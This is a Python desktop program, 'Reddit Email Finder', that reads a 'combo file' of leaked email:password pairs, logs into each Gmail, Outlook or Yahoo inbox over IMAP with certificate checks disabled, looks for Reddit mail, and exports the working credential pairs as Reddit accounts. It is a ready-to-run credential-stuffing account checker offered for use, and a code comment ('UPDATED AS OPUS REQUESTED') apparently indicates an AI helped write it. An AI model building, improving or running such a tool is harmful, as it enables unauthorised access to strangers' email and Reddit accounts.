#!/usr/bin/env python3
"""
Reddit Email Finder - Checks email inboxes for Reddit messages
Works on Mac and Windows
"""

import imaplib
import email
import threading
import queue
import tkinter as tk
from tkinter import filedialog, ttk, scrolledtext
import re
from datetime import datetime
import ssl
import time

class RedditEmailFinder:
    def __init__(self, root):
        self.root = root
        self.root.title("Reddit Email Finder v1.0")
        self.root.geometry("900x700")
        self.root.configure(bg="#1e1e1e")
        
        # Variables
        self.combo_file = None
        self.results = []
        self.checked = 0
        self.found = 0
        self.failed = 0
        self.running = False
        
        self.setup_ui()
        
    def setup_ui(self):
        """Create the user interface"""
        # Title
        title = tk.Label(self.root, text="Reddit Email Finder", 
                        font=("Arial", 24, "bold"), bg="#1e1e1e", fg="#ffffff")
        title.pack(pady=20)
        
        # File selection frame
        file_frame = tk.Frame(self.root, bg="#1e1e1e")
        file_frame.pack(pady=15)
        
        tk.Button(file_frame, text="📁 Select Combo File", command=self.select_file, 
                 bg="#4CAF50", fg="white", font=("Arial", 12, "bold"),
                 padx=25, pady=12, relief=tk.FLAT, cursor="hand2").pack(side=tk.LEFT, padx=10)
        
        self.file_label = tk.Label(file_frame, text="No file selected", 
                                   fg="#888888", bg="#1e1e1e", font=("Arial", 11))
        self.file_label.pack(side=tk.LEFT, padx=10)
        
        # Stats frame with better styling
        stats_frame = tk.Frame(self.root, bg="#2d2d2d", relief=tk.RAISED, bd=2)
        stats_frame.pack(pady=20, padx=20, fill=tk.X)
        
        self.stats_label = tk.Label(stats_frame, text="Ready to start", 
                                    font=("Arial", 13, "bold"), bg="#2d2d2d", 
                                    fg="#ffffff", pady=15)
        self.stats_label.pack()
        
        # Progress bar with styling
        progress_frame = tk.Frame(self.root, bg="#1e1e1e")
        progress_frame.pack(pady=10)
        
        tk.Label(progress_frame, text="Progress:", bg="#1e1e1e", 
                fg="#ffffff", font=("Arial", 11)).pack()
        
        self.progress = ttk.Progressbar(progress_frame, length=700, mode='determinate')
        self.progress.pack(pady=5)
        
        # Log area with better visibility
        log_label = tk.Label(self.root, text="📊 Live Results:", 
                            font=("Arial", 13, "bold"), bg="#1e1e1e", fg="#ffffff")
        log_label.pack(pady=10)
        
        self.log_text = scrolledtext.ScrolledText(self.root, height=15, width=100,
                                                  bg="#2d2d2d", fg="#ffffff",
                                                  font=("Courier", 10),
                                                  insertbackground="#ffffff")
        self.log_text.pack(pady=10, padx=20)
        
        # Buttons with better styling
        button_frame = tk.Frame(self.root, bg="#1e1e1e")
        button_frame.pack(pady=20)
        
        self.start_button = tk.Button(button_frame, text="▶️ Start Checking", 
                                      command=self.start_checking,
                                      bg="#2196F3", fg="white", font=("Arial", 12, "bold"),
                                      padx=35, pady=12, relief=tk.FLAT, cursor="hand2",
                                      state=tk.DISABLED)
        self.start_button.pack(side=tk.LEFT, padx=10)
        
        self.export_button = tk.Button(button_frame, text="💾 Export Results", 
                                       command=self.export_results,
                                       bg="#FF9800", fg="white", font=("Arial", 12, "bold"),
                                       padx=35, pady=12, relief=tk.FLAT, cursor="hand2",
                                       state=tk.DISABLED)
        self.export_button.pack(side=tk.LEFT, padx=10)
        
    def select_file(self):
        """Select combo file"""
        self.combo_file = filedialog.askopenfilename(
            title="Select Combo File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if self.combo_file:
            filename = self.combo_file.split('/')[-1]
            self.file_label.config(text=f"✅ {filename}", fg="#4CAF50")
            self.start_button.config(state=tk.NORMAL)
            self.log("✅ File loaded successfully!")
            
    def log(self, message):
        """Add message to log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
        self.root.update()
        
    def update_stats(self):
        """Update statistics display"""
        self.stats_label.config(
            text=f"✓ Checked: {self.checked}  |  ✅ Found: {self.found}  |  ❌ Failed: {self.failed}"
        )
        
    def check_email(self, email_addr, password):
        """Check single email for Reddit messages"""
        try:
            # Determine email provider - UPDATED AS OPUS REQUESTED
            domain = email_addr.split('@')[1].lower()
            
            if 'gmail' in domain:
                imap_server = 'imap.gmail.com'
            elif 'hotmail' in domain or 'outlook' in domain or 'live' in domain:
                imap_server = 'outlook.office365.com'
            elif 'yahoo' in domain:
                imap_server = 'imap.mail.yahoo.com'
            else:
                # Skip unknown domains
                self.failed += 1
                self.log(f"⚠️ Skipped unknown domain: {email_addr}")
                return False
            
            imap_port = 993
            
            # Connect to IMAP
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            mail = imaplib.IMAP4_SSL(imap_server, imap_port, ssl_context=context)
            mail.login(email_addr, password)
            
            # Select inbox
            mail.select('inbox')
            
            # Search for Reddit emails
            search_criteria = '(FROM "noreply@redditmail.com")'
            
            result, data = mail.search(None, search_criteria)
            
            if data[0]:  # If any emails found
                self.found += 1
                self.results.append(f"{email_addr}:{password}")
                self.log(f"✅ FOUND Reddit emails in: {email_addr}")
                mail.logout()
                return True
            else:
                # Try alternative search
                result, data = mail.search(None, '(FROM "reddit")')
                if data[0]:
                    self.found += 1
                    self.results.append(f"{email_addr}:{password}")
                    self.log(f"✅ FOUND Reddit emails in: {email_addr}")
                    mail.logout()
                    return True
                    
            mail.logout()
            return False
            
        except Exception as e:
            self.failed += 1
            self.log(f"❌ Failed: {email_addr} - {str(e)[:50]}")
            return False
            
    def worker_thread(self, combos):
        """Worker thread for checking emails"""
        for i, combo in enumerate(combos):
            if not self.running:
                break
                
            try:
                email_addr, password = combo.strip().split(':')[:2]
                self.check_email(email_addr.strip(), password.strip())
                self.checked += 1
                
                # Update progress
                progress_value = (self.checked / len(combos)) * 100
                self.progress['value'] = progress_value
                self.update_stats()
                
            except Exception as e:
                self.log(f"⚠️ Error processing line: {combo[:30]}...")
                self.checked += 1
                
        self.running = False
        self.start_button.config(text="▶️ Start Checking", state=tk.NORMAL)
        self.export_button.config(state=tk.NORMAL)
        self.log(f"\n🎯 COMPLETE! Found {self.found} Reddit accounts!")
        
    def start_checking(self):
        """Start the checking process"""
        if self.running:
            self.running = False
            self.start_button.config(text="▶️ Start Checking")
            return
            
        # Reset stats
        self.results = []
        self.checked = 0
        self.found = 0
        self.failed = 0
        self.progress['value'] = 0
        self.log_text.delete(1.0, tk.END)
        
        # Load combos
        with open(self.combo_file, 'r', encoding='utf-8', errors='ignore') as f:
            combos = f.readlines()
            
        self.log(f"📋 Loaded {len(combos)} combos")
        self.log("🔍 Searching for: noreply@redditmail.com")
        self.log("🚀 Starting checks...\n")
        
        self.running = True
        self.start_button.config(text="⏸️ Stop")
        
        # Start worker thread
        thread = threading.Thread(target=self.worker_thread, args=(combos,))
        thread.daemon = True
        thread.start()
        
    def export_results(self):
        """Export results to file"""
        if not self.results:
            self.log("⚠️ No results to export!")
            return
            
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt")],
            initialfile=f"reddit_accounts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        )
        
        if filename:
            with open(filename, 'w') as f:
                for result in self.results:
                    f.write(f"{result}\n")
            self.log(f"✅ Exported {len(self.results)} accounts to {filename.split('/')[-1]}")

def main():
    root = tk.Tk()
    app = RedditEmailFinder(root)
    root.mainloop()

if __name__ == "__main__":
    main()